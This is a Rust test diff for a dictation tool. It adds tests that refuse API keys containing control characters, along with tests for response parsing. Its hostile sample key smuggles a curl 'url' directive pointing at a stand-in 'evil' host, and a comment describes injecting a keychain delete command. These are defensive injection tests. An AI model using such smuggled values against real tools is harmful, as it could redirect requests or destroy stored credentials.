@@ -81,6 +81,30 @@ fn a_secret_tool_payload_carries_no_trailing_newline() {
 }
 
 #[test]
+fn a_key_with_a_newline_is_refused_before_it_reaches_curl_or_the_keychain() {
+    // Both payloads are line-oriented: a newline ends the current directive whatever the quoting.
+    // `\nurl = "…"` would redirect the recording and `\ndelete-generic-password …` would run an
+    // extra keychain verb, so the key is refused rather than escaped. Every C0 control character,
+    // not only `\n`, since none belongs in a base64-ish credential.
+    for hostile in [
+        "sk-abc\nurl = \"http://evil/\"",
+        "sk\rabc",
+        "sk\tabc",
+        "a\u{7f}b",
+    ] {
+        assert_eq!(
+            wtm_dictate::ensure_key_safe(hostile),
+            Err(DictateError::InvalidKey),
+            "should refuse {hostile:?}"
+        );
+    }
+    // An ordinary key, and one with only surrounding whitespace, are accepted — the interior is
+    // what matters, and both call sites trim.
+    assert_eq!(wtm_dictate::ensure_key_safe("sk-abc123"), Ok(()));
+    assert_eq!(wtm_dictate::ensure_key_safe("  sk-abc123  "), Ok(()));
+}
+
+#[test]
 fn keyterms_are_percent_encoded_so_one_cannot_add_query_parameters() {
     // Keyterms are user text. Without encoding, a term containing `&` would append parameters of
     // its own — including a second `model`, which is the interesting one, since the model is what
@@ -202,6 +226,13 @@ fn output_with_no_status_marker_is_treated_as_never_having_arrived() {
     // curl failing before it can write the marker — DNS, a refused connection, a proxy that says
     // no. Diagnosing that as a bad reply would blame the service for the network.
     let err = parse_response("curl: (6) Could not resolve host").unwrap_err();
+    assert!(matches!(err, DictateError::Unreachable { .. }), "{err:?}");
+}
+
+#[test]
+fn a_status_marker_that_is_not_a_number_is_treated_as_never_having_arrived() {
+    // `unwrap_or(0)` used to report this as HTTP 0, which looks like a service refusal.
+    let err = parse_response("{}\nwtm-status:not-a-code").unwrap_err();
     assert!(matches!(err, DictateError::Unreachable { .. }), "{err:?}");
 }
 
